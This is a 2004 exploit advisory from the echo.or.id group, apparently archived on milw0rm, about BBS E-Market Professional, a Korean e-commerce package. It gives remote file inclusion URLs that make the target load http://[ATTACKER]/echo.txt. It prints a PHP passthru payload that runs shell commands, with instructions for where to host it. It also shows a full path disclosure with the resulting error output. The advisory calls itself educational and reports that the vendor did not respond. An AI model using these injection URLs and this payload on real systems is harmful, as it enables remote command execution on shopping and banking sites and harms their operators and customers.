@@ -1,0 +1,138 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \
+ |    __)_ /    \  \//    ~    \/   |   \
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/
+
+          .OR.ID
+ECHO_ADV_06$2004
+
+---------------------------------------------------------------------------
+                    Multiple  vulnerabilities 1n BBS E-Market Professional
+---------------------------------------------------------------------------
+
+Author: y3dips
+Date: Sept, 7th 2004
+Location: Indonesian, Jakarta
+Web: http://echo.or.id/adv/adv06-y3dips-2004.txt
+
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+E-market is commercial software made by korean company, includes shopping mall, 
+community , e-crm (e-customer relationship management) , group buying ,weblog, 
+auction, estimate sheet , and other features
+
+web : http://www.nt.co.kr
+        http://www.bbs2000.co.kr
+
+Risk: very high ( ***** )
+       most off all korean sites that handle e-shop , e-banking,... use this
+       d**n software
+
+else, no more info could get cause the site in korean language :(
+
+---------------------------------------------------------------------------
+
+
+Vulnerabilities:
+~~~~~~~~~~~~~~~~
+
+1. Remote Command Execution
+
+Remote command execution on 'becommunity' (modules that support by BBS e-market
+professional)  makes insecure calls to the include() function of PHP (works 
+on " pageurl= " functions )  which can allow the inclusion of remote files, 
+and thereby the execution of arbitrary commands by remote user with  the web 
+server user permissions, usually 'nobody' .
+
+
+http://[TARGET]/becommunity/community/index.php?pageurl=[injection URL]
+http://[TARGET]/becommunity/community/index.php?from_market=Y&pageurl=[injection URL]
+
+POC=
+
+http://[TARGET]/becommunity/community/index.php?pageurl=http://[ATTACKER]/echo.txt?
+http://[TARGET]/becommunity/community/index.php?from_market=Y&pageurl=http://[ATTACKER]/echo.txt?
+
+---------------------------------------------------------------------------
+
+Exploit :
+~~~~~~~~~
+
+-------------------------------- cut -------------------------------------
+
+<?
+echo "".passthru(' ls -la ; id ')."";
+?>
+
+
+---------------------------------- cut ------------------------------------
+
+save on attacker URL with name: echo.txt , to get a listing of file or directories ,
+with user id that we got
+
+--------------------------------------------------------------------------
+
+2. Full Path disclosure
+
+A remote user can access the file to cause the system to display an error 
+message that indicates the installation path. The resulting error message 
+will disclose potentially sensitive installation path information to the 
+remote attacker.
+
+http://[TARGET]/becommunity/community/index.php?from_market=[char]
+
+POC =
+
+http://[TARGET]/becommunity/community/index.php?from_market=dudul
+
+
+Warning: main(main.php) [function.main]: failed to create stream: No such file 
+or directory in /home5/standard_r5/[TARGET]/html/becommunity/community/index.php on line 239
+
+Warning: main() [function.main]: Failed opening 'main.php' for inclusion 
+(include_path='.:/usr/local/php/lib/php') 
+in /home5/standard_r5/[TARGET]/html/becommunity/community/index.php on line 239
+
+
+---------------------------------------------------------------------------
+
+The fix:
+~~~~~
+No Access to the code,- so buh bye :)
+Vendor allready contacted but  no response till now
+
+---------------------------------------------------------------------------
+
+Disclamier:
+~~~~~~~
+
+Advice, directions, instructions and script on security vulnerabilities 
+in this advisory for educational purpose, y3dips nor echo.or.id does not 
+accept responsibility for any damage or injury caused as a result of its use
+
+
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~~~
+
+~ K-159, m0by, the_day, comex, z3r0byt3, c-a-s-e, S`to @T echo/staff
+~ Biatch-x, yudhax, lieur-euy || newbie_hacker@yahoogroups.com 
+~ #e-c-h-o & #aikmel @DALNET
+
+---------------------------------------------------------------------------
+
+Contact:
+~~~~~~~~
+
+     y3dips || echo|staff || y3dips(at)echo(dot)or(dot)id
+     Homepage: http://y3dips.echo.or.id/
+
+-------------------------------- [ EOF ] ----------------------------------
+
+# milw0rm.com [2006-12-02]
